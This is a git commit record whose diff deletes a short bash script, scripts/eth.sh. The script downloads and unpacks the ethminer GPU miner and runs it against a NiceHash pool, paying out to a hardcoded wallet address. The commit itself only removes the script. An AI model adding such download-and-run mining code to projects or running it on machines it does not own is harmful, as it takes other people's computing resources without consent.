0daffb5a057a16e94b250c89fdbc67cae118f924
chuhanh-0704 <81749820+chuhanh-0704@users.noreply.github.com>
2021-04-03 19:14:09 +0700

    Delete eth.sh

--- scripts/eth.sh
+++
@@ -1,5 +0,0 @@
-#! /bin/bash
-wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
-tar -xvf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
-rm -f ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
-cd bin && ./ethminer -U -G  -P stratum2+tcp://3GyGjRsX3t8axeizmetLoneBwazCp6GNRf.ethminer@daggerhashimoto.usa.nicehash.com:3353
